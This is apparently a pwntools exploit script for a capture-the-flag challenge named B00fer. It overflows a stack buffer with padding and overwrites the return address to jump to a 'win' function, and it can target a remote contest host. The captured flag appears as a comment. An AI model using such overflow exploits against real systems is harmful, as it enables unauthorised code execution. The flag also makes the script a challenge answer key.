#!/usr/bin/env python3

from pwn import *

elf = ELF("./B00fer_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)


def start():
    if args.REMOTE:
        return remote("b00fer.niccgetsspooky.xyz", 9001)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================
payload = b"A"*32
payload += b"BBBBBBBB"
payload += p64(elf.sym.win)

sla(b"getting our flag.", payload)

#NICC{Sp00ked_the_fl4g_0ut_of_m3}
#========= interactive ====================
r.interactive()
